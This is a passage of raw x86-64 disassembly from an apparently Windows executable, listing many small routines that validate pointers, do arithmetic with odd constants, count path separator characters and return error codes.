   1400035e7:	83 c8 ff             	or     $0xffffffff,%eax
   1400035ea:	c3                   	ret
   1400035eb:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400035f2:	72 3b                	jb     0x14000362f
   1400035f4:	48 83 ec 28          	sub    $0x28,%rsp
   1400035f8:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   1400035ff:	00 
   140003600:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140003605:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000360a:	e8 5a fd ff ff       	call   0x140003369
   14000360f:	01 44 24 08          	add    %eax,0x8(%rsp)
   140003613:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140003618:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   14000361d:	e8 b8 fe ff ff       	call   0x1400034da
   140003622:	01 44 24 08          	add    %eax,0x8(%rsp)
   140003626:	8b 44 24 08          	mov    0x8(%rsp),%eax
   14000362a:	48 83 c4 28          	add    $0x28,%rsp
   14000362e:	c3                   	ret
   14000362f:	83 c8 ff             	or     $0xffffffff,%eax
   140003632:	c3                   	ret
   140003633:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000363a:	72 14                	jb     0x140003650
   14000363c:	0f b7 01             	movzwl (%rcx),%eax
   14000363f:	25 f9 65 bc 00       	and    $0xbc65f9,%eax
   140003644:	69 c0 fb 00 00 00    	imul   $0xfb,%eax,%eax
   14000364a:	35 dc c9 26 00       	xor    $0x26c9dc,%eax
   14000364f:	c3                   	ret
   140003650:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140003655:	c3                   	ret
   140003656:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000365d:	73 07                	jae    0x140003666
   14000365f:	48 8d 0d be 13 00 00 	lea    0x13be(%rip),%rcx        # 0x140004a24
   140003666:	31 c0                	xor    %eax,%eax
   140003668:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   14000366e:	45 85 d2             	test   %r10d,%r10d
   140003671:	74 17                	je     0x14000368a
   140003673:	41 83 ea 01          	sub    $0x1,%r10d
   140003677:	0f b6 11             	movzbl (%rcx),%edx
   14000367a:	84 d2                	test   %dl,%dl
   14000367c:	74 0c                	je     0x14000368a
   14000367e:	80 fa 2f             	cmp    $0x2f,%dl
   140003681:	75 02                	jne    0x140003685
   140003683:	ff c0                	inc    %eax
   140003685:	48 ff c1             	inc    %rcx
   140003688:	eb e4                	jmp    0x14000366e
   14000368a:	c3                   	ret
   14000368b:	48 83 ec 28          	sub    $0x28,%rsp
   14000368f:	31 c9                	xor    %ecx,%ecx
   140003691:	ff 15 35 8f d6 05    	call   *0x5d68f35(%rip)        # 0x145d6c5cc
   140003697:	48 85 c0             	test   %rax,%rax
   14000369a:	74 0a                	je     0x1400036a6
   14000369c:	25 ff ff 00 00       	and    $0xffff,%eax
   1400036a1:	48 83 c4 28          	add    $0x28,%rsp
   1400036a5:	c3                   	ret
   1400036a6:	83 c8 ff             	or     $0xffffffff,%eax
   1400036a9:	48 83 c4 28          	add    $0x28,%rsp
   1400036ad:	c3                   	ret
   1400036ae:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400036b5:	72 0e                	jb     0x1400036c5
   1400036b7:	0f b7 01             	movzwl (%rcx),%eax
   1400036ba:	0d 3f 48 af 00       	or     $0xaf483f,%eax
   1400036bf:	0d c6 f9 ca 00       	or     $0xcaf9c6,%eax
   1400036c4:	c3                   	ret
   1400036c5:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1400036ca:	c3                   	ret
   1400036cb:	89 c8                	mov    %ecx,%eax
   1400036cd:	c1 e8 14             	shr    $0x14,%eax
   1400036d0:	25 ff 0f 00 00       	and    $0xfff,%eax
   1400036d5:	3d 90 04 00 00       	cmp    $0x490,%eax
   1400036da:	75 06                	jne    0x1400036e2
   1400036dc:	0d 00 00 00 40       	or     $0x40000000,%eax
   1400036e1:	c3                   	ret
   1400036e2:	25 ff 07 00 00       	and    $0x7ff,%eax
   1400036e7:	c3                   	ret
   1400036e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400036ec:	31 c9                	xor    %ecx,%ecx
   1400036ee:	ff 15 d8 8e d6 05    	call   *0x5d68ed8(%rip)        # 0x145d6c5cc
   1400036f4:	48 85 c0             	test   %rax,%rax
   1400036f7:	74 0d                	je     0x140003706
   1400036f9:	89 c2                	mov    %eax,%edx
   1400036fb:	48 c1 e8 10          	shr    $0x10,%rax
   1400036ff:	31 d0                	xor    %edx,%eax
   140003701:	48 83 c4 28          	add    $0x28,%rsp
   140003705:	c3                   	ret
   140003706:	83 c8 ff             	or     $0xffffffff,%eax
   140003709:	48 83 c4 28          	add    $0x28,%rsp
   14000370d:	c3                   	ret
   14000370e:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003715:	72 26                	jb     0x14000373d
   140003717:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   14000371e:	72 1d                	jb     0x14000373d
   140003720:	44 0f b7 01          	movzwl (%rcx),%r8d
   140003724:	44 0f b7 0a          	movzwl (%rdx),%r9d
   140003728:	66 45 39 c8          	cmp    %r9w,%r8w
   14000372c:	7c 05                	jl     0x140003733
   14000372e:	7f 07                	jg     0x140003737
   140003730:	31 c0                	xor    %eax,%eax
   140003732:	c3                   	ret
   140003733:	83 c8 ff             	or     $0xffffffff,%eax
   140003736:	c3                   	ret
   140003737:	b8 01 00 00 00       	mov    $0x1,%eax
   14000373c:	c3                   	ret
   14000373d:	b8 57 00 07 80       	mov    $0x80070057,%eax
   140003742:	c3                   	ret
   140003743:	89 c8                	mov    %ecx,%eax
   140003745:	c1 e8 14             	shr    $0x14,%eax
   140003748:	83 e0 0f             	and    $0xf,%eax
   14000374b:	83 f8 0c             	cmp    $0xc,%eax
   14000374e:	75 06                	jne    0x140003756
   140003750:	0d 00 00 00 40       	or     $0x40000000,%eax
   140003755:	c3                   	ret
   140003756:	83 e0 07             	and    $0x7,%eax
   140003759:	c3                   	ret
   14000375a:	48 83 ec 28          	sub    $0x28,%rsp
   14000375e:	85 c9                	test   %ecx,%ecx
   140003760:	74 46                	je     0x1400037a8
   140003762:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140003768:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000376c:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140003773:	00 
   140003774:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140003779:	7e 2d                	jle    0x1400037a8
   14000377b:	c7 44 24 10 0b 00 00 	movl   $0xb,0x10(%rsp)
   140003782:	00 
   140003783:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140003788:	7e 17                	jle    0x1400037a1
   14000378a:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   14000378e:	03 44 24 10          	add    0x10(%rsp),%eax
   140003792:	03 44 24 08          	add    0x8(%rsp),%eax
   140003796:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   14000379a:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   14000379f:	eb e2                	jmp    0x140003783
   1400037a1:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   1400037a6:	eb cc                	jmp    0x140003774
   1400037a8:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   1400037ac:	48 83 c4 28          	add    $0x28,%rsp
   1400037b0:	c3                   	ret
   1400037b1:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400037b8:	72 4e                	jb     0x140003808
   1400037ba:	48 83 ec 28          	sub    $0x28,%rsp
   1400037be:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   1400037c5:	00 
   1400037c6:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   1400037cb:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   1400037d0:	e8 b6 fe ff ff       	call   0x14000368b
   1400037d5:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400037d9:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   1400037de:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400037e3:	e8 e3 fe ff ff       	call   0x1400036cb
   1400037e8:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400037ec:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   1400037f1:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400037f6:	e8 ed fe ff ff       	call   0x1400036e8
   1400037fb:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400037ff:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140003803:	48 83 c4 28          	add    $0x28,%rsp
   140003807:	c3                   	ret
   140003808:	83 c8 ff             	or     $0xffffffff,%eax
   14000380b:	c3                   	ret
   14000380c:	89 c8                	mov    %ecx,%eax
   14000380e:	c1 e8 0c             	shr    $0xc,%eax
   140003811:	25 ff 00 00 00       	and    $0xff,%eax
   140003816:	83 f8 54             	cmp    $0x54,%eax
   140003819:	75 06                	jne    0x140003821
   14000381b:	0d 00 00 00 10       	or     $0x10000000,%eax
   140003820:	c3                   	ret
   140003821:	83 e0 7f             	and    $0x7f,%eax
   140003824:	c3                   	ret
   140003825:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000382c:	72 4e                	jb     0x14000387c
   14000382e:	48 83 ec 28          	sub    $0x28,%rsp
   140003832:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140003839:	00 
   14000383a:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   14000383f:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140003844:	e8 c3 ff ff ff       	call   0x14000380c
   140003849:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000384d:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140003852:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140003857:	e8 6f fe ff ff       	call   0x1400036cb
   14000385c:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140003860:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140003865:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000386a:	e8 d4 fe ff ff       	call   0x140003743
   14000386f:	01 44 24 08          	add    %eax,0x8(%rsp)
   140003873:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140003877:	48 83 c4 28          	add    $0x28,%rsp
   14000387b:	c3                   	ret
   14000387c:	83 c8 ff             	or     $0xffffffff,%eax
   14000387f:	c3                   	ret
   140003880:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003887:	72 13                	jb     0x14000389c
   140003889:	0f b6 01             	movzbl (%rcx),%eax
   14000388c:	69 c0 d9 00 00 00    	imul   $0xd9,%eax,%eax
   140003892:	69 c0 df 00 00 00    	imul   $0xdf,%eax,%eax
   140003898:	6b c0 38             	imul   $0x38,%eax,%eax
   14000389b:	c3                   	ret
   14000389c:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1400038a1:	c3                   	ret
   1400038a2:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400038a9:	72 23                	jb     0x1400038ce
   1400038ab:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   1400038b2:	72 1a                	jb     0x1400038ce
   1400038b4:	44 8b 01             	mov    (%rcx),%r8d
   1400038b7:	44 8b 0a             	mov    (%rdx),%r9d
   1400038ba:	45 39 c8             	cmp    %r9d,%r8d
   1400038bd:	7c 05                	jl     0x1400038c4
   1400038bf:	7f 07                	jg     0x1400038c8
   1400038c1:	31 c0                	xor    %eax,%eax
   1400038c3:	c3                   	ret
   1400038c4:	83 c8 ff             	or     $0xffffffff,%eax
   1400038c7:	c3                   	ret
   1400038c8:	b8 01 00 00 00       	mov    $0x1,%eax
   1400038cd:	c3                   	ret
   1400038ce:	b8 57 00 07 80       	mov    $0x80070057,%eax
   1400038d3:	c3                   	ret
   1400038d4:	48 83 ec 28          	sub    $0x28,%rsp
   1400038d8:	31 c9                	xor    %ecx,%ecx
   1400038da:	ff 15 ec 8c d6 05    	call   *0x5d68cec(%rip)        # 0x145d6c5cc
   1400038e0:	48 85 c0             	test   %rax,%rax
   1400038e3:	74 0a                	je     0x1400038ef
   1400038e5:	25 ff ff 00 00       	and    $0xffff,%eax
   1400038ea:	48 83 c4 28          	add    $0x28,%rsp
   1400038ee:	c3                   	ret
   1400038ef:	83 c8 ff             	or     $0xffffffff,%eax
   1400038f2:	48 83 c4 28          	add    $0x28,%rsp
   1400038f6:	c3                   	ret
   1400038f7:	48 83 ec 28          	sub    $0x28,%rsp
   1400038fb:	31 c9                	xor    %ecx,%ecx
   1400038fd:	ff 15 c9 8c d6 05    	call   *0x5d68cc9(%rip)        # 0x145d6c5cc
   140003903:	48 85 c0             	test   %rax,%rax
   140003906:	74 05                	je     0x14000390d
   140003908:	48 83 c4 28          	add    $0x28,%rsp
   14000390c:	c3                   	ret
   14000390d:	83 c8 ff             	or     $0xffffffff,%eax
   140003910:	48 83 c4 28          	add    $0x28,%rsp
   140003914:	c3                   	ret
   140003915:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000391c:	72 12                	jb     0x140003930
   14000391e:	8b 01                	mov    (%rcx),%eax
   140003920:	35 c7 5c d1 00       	xor    $0xd15cc7,%eax
   140003925:	25 7e 89 b9 00       	and    $0xb9897e,%eax
   14000392a:	25 7f c2 12 00       	and    $0x12c27f,%eax
   14000392f:	c3                   	ret
   140003930:	b8 57 00 07 80       	mov    $0x80070057,%eax
   140003935:	c3                   	ret
   140003936:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000393d:	72 3b                	jb     0x14000397a
   14000393f:	48 83 ec 28          	sub    $0x28,%rsp
   140003943:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   14000394a:	00 
   14000394b:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140003950:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140003955:	e8 bb ff ff ff       	call   0x140003915
   14000395a:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000395e:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140003963:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   140003968:	e8 35 ff ff ff       	call   0x1400038a2
   14000396d:	01 44 24 08          	add    %eax,0x8(%rsp)
   140003971:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140003975:	48 83 c4 28          	add    $0x28,%rsp
   140003979:	c3                   	ret
   14000397a:	83 c8 ff             	or     $0xffffffff,%eax
   14000397d:	c3                   	ret
   14000397e:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003985:	72 23                	jb     0x1400039aa
   140003987:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   14000398e:	72 1a                	jb     0x1400039aa
   140003990:	44 8b 01             	mov    (%rcx),%r8d
   140003993:	44 8b 0a             	mov    (%rdx),%r9d
   140003996:	45 39 c8             	cmp    %r9d,%r8d
   140003999:	7c 05                	jl     0x1400039a0
   14000399b:	7f 07                	jg     0x1400039a4
   14000399d:	31 c0                	xor    %eax,%eax
   14000399f:	c3                   	ret
   1400039a0:	83 c8 ff             	or     $0xffffffff,%eax
   1400039a3:	c3                   	ret
   1400039a4:	b8 01 00 00 00       	mov    $0x1,%eax
   1400039a9:	c3                   	ret
   1400039aa:	b8 57 00 07 80       	mov    $0x80070057,%eax
   1400039af:	c3                   	ret
   1400039b0:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400039b7:	73 07                	jae    0x1400039c0
   1400039b9:	48 8d 0d a0 0f 00 00 	lea    0xfa0(%rip),%rcx        # 0x140004960
   1400039c0:	31 c0                	xor    %eax,%eax
   1400039c2:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   1400039c8:	45 85 d2             	test   %r10d,%r10d
   1400039cb:	74 17                	je     0x1400039e4
   1400039cd:	41 83 ea 01          	sub    $0x1,%r10d
   1400039d1:	0f b6 11             	movzbl (%rcx),%edx
   1400039d4:	84 d2                	test   %dl,%dl
   1400039d6:	74 0c                	je     0x1400039e4
   1400039d8:	80 fa 2f             	cmp    $0x2f,%dl
   1400039db:	75 02                	jne    0x1400039df
   1400039dd:	ff c0                	inc    %eax
   1400039df:	48 ff c1             	inc    %rcx
   1400039e2:	eb e4                	jmp    0x1400039c8
   1400039e4:	c3                   	ret
   1400039e5:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400039ec:	72 10                	jb     0x1400039fe
   1400039ee:	0f b6 01             	movzbl (%rcx),%eax
   1400039f1:	69 c0 e8 00 00 00    	imul   $0xe8,%eax,%eax
   1400039f7:	69 c0 8c 00 00 00    	imul   $0x8c,%eax,%eax
   1400039fd:	c3                   	ret
   1400039fe:	83 c8 ff             	or     $0xffffffff,%eax
   140003a01:	c3                   	ret
   140003a02:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003a09:	72 09                	jb     0x140003a14
   140003a0b:	0f b6 01             	movzbl (%rcx),%eax
   140003a0e:	25 73 b8 a7 00       	and    $0xa7b873,%eax
   140003a13:	c3                   	ret
   140003a14:	b8 05 40 00 80       	mov    $0x80004005,%eax
   140003a19:	c3                   	ret
   140003a1a:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003a21:	72 23                	jb     0x140003a46
   140003a23:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   140003a2a:	72 1a                	jb     0x140003a46
   140003a2c:	44 8b 01             	mov    (%rcx),%r8d
   140003a2f:	44 8b 0a             	mov    (%rdx),%r9d
   140003a32:	45 39 c8             	cmp    %r9d,%r8d
   140003a35:	7c 05                	jl     0x140003a3c
   140003a37:	7f 07                	jg     0x140003a40
   140003a39:	31 c0                	xor    %eax,%eax
   140003a3b:	c3                   	ret
   140003a3c:	83 c8 ff             	or     $0xffffffff,%eax
   140003a3f:	c3                   	ret
   140003a40:	b8 01 00 00 00       	mov    $0x1,%eax
   140003a45:	c3                   	ret
   140003a46:	b8 57 00 07 80       	mov    $0x80070057,%eax
   140003a4b:	c3                   	ret
   140003a4c:	48 83 ec 28          	sub    $0x28,%rsp
   140003a50:	31 c9                	xor    %ecx,%ecx
   140003a52:	ff 15 74 8b d6 05    	call   *0x5d68b74(%rip)        # 0x145d6c5cc
   140003a58:	48 85 c0             	test   %rax,%rax
   140003a5b:	74 0a                	je     0x140003a67
   140003a5d:	25 ff ff 00 00       	and    $0xffff,%eax
   140003a62:	48 83 c4 28          	add    $0x28,%rsp
   140003a66:	c3                   	ret
   140003a67:	83 c8 ff             	or     $0xffffffff,%eax
   140003a6a:	48 83 c4 28          	add    $0x28,%rsp
   140003a6e:	c3                   	ret
   140003a6f:	89 c8                	mov    %ecx,%eax
   140003a71:	c1 e8 04             	shr    $0x4,%eax
   140003a74:	25 ff 00 00 00       	and    $0xff,%eax
   140003a79:	83 f8 31             	cmp    $0x31,%eax
   140003a7c:	75 06                	jne    0x140003a84
   140003a7e:	0d 00 02 00 00       	or     $0x200,%eax
   140003a83:	c3                   	ret
   140003a84:	83 e0 7f             	and    $0x7f,%eax
   140003a87:	c3                   	ret
   140003a88:	48 83 ec 28          	sub    $0x28,%rsp
   140003a8c:	31 c9                	xor    %ecx,%ecx
   140003a8e:	ff 15 38 8b d6 05    	call   *0x5d68b38(%rip)        # 0x145d6c5cc
   140003a94:	48 85 c0             	test   %rax,%rax
   140003a97:	74 05                	je     0x140003a9e
   140003a99:	48 83 c4 28          	add    $0x28,%rsp
   140003a9d:	c3                   	ret
   140003a9e:	83 c8 ff             	or     $0xffffffff,%eax
   140003aa1:	48 83 c4 28          	add    $0x28,%rsp
   140003aa5:	c3                   	ret
   140003aa6:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003aad:	73 07                	jae    0x140003ab6
   140003aaf:	48 8d 0d 50 14 00 00 	lea    0x1450(%rip),%rcx        # 0x140004f06
   140003ab6:	31 c0                	xor    %eax,%eax
   140003ab8:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   140003abe:	45 85 d2             	test   %r10d,%r10d
   140003ac1:	74 17                	je     0x140003ada
   140003ac3:	41 83 ea 01          	sub    $0x1,%r10d
   140003ac7:	0f b6 11             	movzbl (%rcx),%edx
   140003aca:	84 d2                	test   %dl,%dl
   140003acc:	74 0c                	je     0x140003ada
   140003ace:	80 fa 5c             	cmp    $0x5c,%dl
   140003ad1:	75 02                	jne    0x140003ad5
   140003ad3:	ff c0                	inc    %eax
   140003ad5:	48 ff c1             	inc    %rcx
   140003ad8:	eb e4                	jmp    0x140003abe
   140003ada:	c3                   	ret
   140003adb:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003ae2:	72 4e                	jb     0x140003b32
   140003ae4:	48 83 ec 28          	sub    $0x28,%rsp
   140003ae8:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140003aef:	00 
   140003af0:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140003af5:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   140003afa:	e8 03 ff ff ff       	call   0x140003a02
   140003aff:	01 44 24 08          	add    %eax,0x8(%rsp)
   140003b03:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140003b08:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003b0d:	e8 24 fe ff ff       	call   0x140003936
   140003b12:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140003b16:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140003b1b:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140003b20:	e8 4a ff ff ff       	call   0x140003a6f
   140003b25:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140003b29:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140003b2d:	48 83 c4 28          	add    $0x28,%rsp
   140003b31:	c3                   	ret
   140003b32:	83 c8 ff             	or     $0xffffffff,%eax
   140003b35:	c3                   	ret
   140003b36:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003b3d:	72 08                	jb     0x140003b47
   140003b3f:	8b 01                	mov    (%rcx),%eax
   140003b41:	35 79 5e 17 00       	xor    $0x175e79,%eax
   140003b46:	c3                   	ret
   140003b47:	b8 57 00 07 80       	mov    $0x80070057,%eax
   140003b4c:	c3                   	ret
   140003b4d:	48 83 ec 28          	sub    $0x28,%rsp
   140003b51:	31 c9                	xor    %ecx,%ecx
   140003b53:	ff 15 73 8a d6 05    	call   *0x5d68a73(%rip)        # 0x145d6c5cc
   140003b59:	48 85 c0             	test   %rax,%rax
   140003b5c:	74 05                	je     0x140003b63
   140003b5e:	48 83 c4 28          	add    $0x28,%rsp
   140003b62:	c3                   	ret
   140003b63:	83 c8 ff             	or     $0xffffffff,%eax
   140003b66:	48 83 c4 28          	add    $0x28,%rsp
   140003b6a:	c3                   	ret
   140003b6b:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003b72:	72 4e                	jb     0x140003bc2
   140003b74:	48 83 ec 28          	sub    $0x28,%rsp
   140003b78:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140003b7f:	00 
   140003b80:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140003b85:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003b8a:	e8 e0 fe ff ff       	call   0x140003a6f
   140003b8f:	01 44 24 08          	add    %eax,0x8(%rsp)
   140003b93:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140003b98:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003b9d:	e8 78 fe ff ff       	call   0x140003a1a
   140003ba2:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140003ba6:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140003bab:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   140003bb0:	e8 fb fd ff ff       	call   0x1400039b0
   140003bb5:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140003bb9:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140003bbd:	48 83 c4 28          	add    $0x28,%rsp
   140003bc1:	c3                   	ret
   140003bc2:	83 c8 ff             	or     $0xffffffff,%eax
   140003bc5:	c3                   	ret
   140003bc6:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003bcd:	72 09                	jb     0x140003bd8
   140003bcf:	0f b7 01             	movzwl (%rcx),%eax
   140003bd2:	25 c7 a1 7f 00       	and    $0x7fa1c7,%eax
   140003bd7:	c3                   	ret
   140003bd8:	83 c8 ff             	or     $0xffffffff,%eax
   140003bdb:	c3                   	ret
   140003bdc:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003be3:	73 07                	jae    0x140003bec
   140003be5:	48 8d 0d f1 0e 00 00 	lea    0xef1(%rip),%rcx        # 0x140004add
   140003bec:	31 c0                	xor    %eax,%eax
   140003bee:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   140003bf4:	45 85 d2             	test   %r10d,%r10d
   140003bf7:	74 1a                	je     0x140003c13
   140003bf9:	41 83 ea 01          	sub    $0x1,%r10d
   140003bfd:	0f b7 11             	movzwl (%rcx),%edx
   140003c00:	66 85 d2             	test   %dx,%dx
   140003c03:	74 0e                	je     0x140003c13
   140003c05:	66 83 fa 2e          	cmp    $0x2e,%dx
   140003c09:	75 02                	jne    0x140003c0d
   140003c0b:	ff c0                	inc    %eax
   140003c0d:	48 83 c1 02          	add    $0x2,%rcx
   140003c11:	eb e1                	jmp    0x140003bf4
   140003c13:	c3                   	ret
   140003c14:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003c1b:	73 07                	jae    0x140003c24
   140003c1d:	48 8d 0d c0 0d 00 00 	lea    0xdc0(%rip),%rcx        # 0x1400049e4
   140003c24:	31 c0                	xor    %eax,%eax
   140003c26:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   140003c2c:	45 85 d2             	test   %r10d,%r10d
   140003c2f:	74 1a                	je     0x140003c4b
   140003c31:	41 83 ea 01          	sub    $0x1,%r10d
   140003c35:	0f b7 11             	movzwl (%rcx),%edx
   140003c38:	66 85 d2             	test   %dx,%dx
   140003c3b:	74 0e                	je     0x140003c4b
   140003c3d:	66 83 fa 5c          	cmp    $0x5c,%dx
   140003c41:	75 02                	jne    0x140003c45
   140003c43:	ff c0                	inc    %eax
   140003c45:	48 83 c1 02          	add    $0x2,%rcx
   140003c49:	eb e1                	jmp    0x140003c2c
   140003c4b:	c3                   	ret
   140003c4c:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003c53:	72 0d                	jb     0x140003c62
   140003c55:	8b 01                	mov    (%rcx),%eax
   140003c57:	25 48 19 28 00       	and    $0x281948,%eax
   140003c5c:	0d 05 b1 18 00       	or     $0x18b105,%eax
   140003c61:	c3                   	ret
   140003c62:	b8 57 00 07 80       	mov    $0x80070057,%eax
   140003c67:	c3                   	ret
   140003c68:	89 c8                	mov    %ecx,%eax
   140003c6a:	c1 e8 0c             	shr    $0xc,%eax
   140003c6d:	25 ff ff 00 00       	and    $0xffff,%eax
   140003c72:	3d 6d c2 00 00       	cmp    $0xc26d,%eax
   140003c77:	75 06                	jne    0x140003c7f
   140003c79:	0d 00 01 00 00       	or     $0x100,%eax
   140003c7e:	c3                   	ret
   140003c7f:	25 ff 7f 00 00       	and    $0x7fff,%eax
   140003c84:	c3                   	ret
   140003c85:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003c8c:	72 3b                	jb     0x140003cc9
   140003c8e:	48 83 ec 28          	sub    $0x28,%rsp
   140003c92:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140003c99:	00 
   140003c9a:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140003c9f:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   140003ca4:	e8 32 fe ff ff       	call   0x140003adb
   140003ca9:	01 44 24 08          	add    %eax,0x8(%rsp)
   140003cad:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140003cb2:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003cb7:	e8 20 ff ff ff       	call   0x140003bdc
   140003cbc:	01 44 24 08          	add    %eax,0x8(%rsp)
   140003cc0:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140003cc4:	48 83 c4 28          	add    $0x28,%rsp
   140003cc8:	c3                   	ret
   140003cc9:	83 c8 ff             	or     $0xffffffff,%eax
   140003ccc:	c3                   	ret
   140003ccd:	48 83 ec 28          	sub    $0x28,%rsp
   140003cd1:	85 c9                	test   %ecx,%ecx
   140003cd3:	74 47                	je     0x140003d1c
   140003cd5:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140003cdb:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140003cdf:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140003ce6:	00 
   140003ce7:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140003cec:	7e 2e                	jle    0x140003d1c
   140003cee:	c7 44 24 10 0c 00 00 	movl   $0xc,0x10(%rsp)
   140003cf5:	00 
   140003cf6:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140003cfb:	7e 18                	jle    0x140003d15
   140003cfd:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003d01:	0f af 44 24 10       	imul   0x10(%rsp),%eax
   140003d06:	03 44 24 08          	add    0x8(%rsp),%eax
   140003d0a:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140003d0e:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140003d13:	eb e1                	jmp    0x140003cf6
